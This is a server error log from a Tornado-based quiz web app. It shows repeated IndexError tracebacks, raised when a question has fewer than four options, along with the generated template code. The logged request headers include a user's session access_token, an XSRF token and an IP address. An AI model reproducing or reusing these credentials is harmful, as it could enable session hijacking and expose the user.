 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505788998e4c8571c2b49cf8&answers=%5B0%2C2%2C3%5D&cursor=12&_xsrf=c93f29dc84554be4a548722556f77501', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '101', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.134.38.179', 'Cookie': '__utma=188782963.1786246707.1347912966.1347912966.1347912966.1; __utmb=188782963.5.10.1347912966; __utmc=188782963; __utmz=188782963.1347912966.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFCTjZBM0RaQzdrYUNnVFBMZ0VjQTY5TEZHWENzUklFeE55TGlvelBaQ2psQktpT21rMWl3RFBBekI2cTd6RjY5S2E0N1pDcTQ0R0lSWkJCUGtUeEJEWkNGZG5QSWdBWkRaRA==|1347912984|b050ca7bac7832459a91753256ed2d0ba4e9fea3"; _xsrf=c93f29dc84554be4a548722556f77501', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 169.38ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505788998e4c8571c2b49cf8&answers=%5B3%5D&cursor=16&_xsrf=c93f29dc84554be4a548722556f77501', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '93', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.134.38.179', 'Cookie': '__utma=188782963.1786246707.1347912966.1347912966.1347912966.1; __utmb=188782963.5.10.1347912966; __utmc=188782963; __utmz=188782963.1347912966.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFCTjZBM0RaQzdrYUNnVFBMZ0VjQTY5TEZHWENzUklFeE55TGlvelBaQ2psQktpT21rMWl3RFBBekI2cTd6RjY5S2E0N1pDcTQ0R0lSWkJCUGtUeEJEWkNGZG5QSWdBWkRaRA==|1347912984|b050ca7bac7832459a91753256ed2d0ba4e9fea3"; _xsrf=c93f29dc84554be4a548722556f77501', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 272.24ms
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505791a88e4c85783e2877b5&answers=%5B1%2C2%2C3%5D&cursor=3&_xsrf=c93f29dc84554be4a548722556f77501', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '100', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.134.38.179', 'Cookie': '__utma=188782963.1786246707.1347912966.1347912966.1347912966.1; __utmb=188782963.15.10.1347912966; __utmc=188782963; __utmz=188782963.1347912966.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=c93f29dc84554be4a548722556f77501; access_token="QUFBRzZsTmNzNkdjQkFCTjZBM0RaQzdrYUNnVFBMZ0VjQTY5TEZHWENzUklFeE55TGlvelBaQ2psQktpT21rMWl3RFBBekI2cTd6RjY5S2E0N1pDcTQ0R0lSWkJCUGtUeEJEWkNGZG5QSWdBWkRaRA==|1347915824|c4f651f974d08b88a84101f047d2cd93f3478f3d"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 203.78ms
ERROR:root:ui-modules/question.html code:
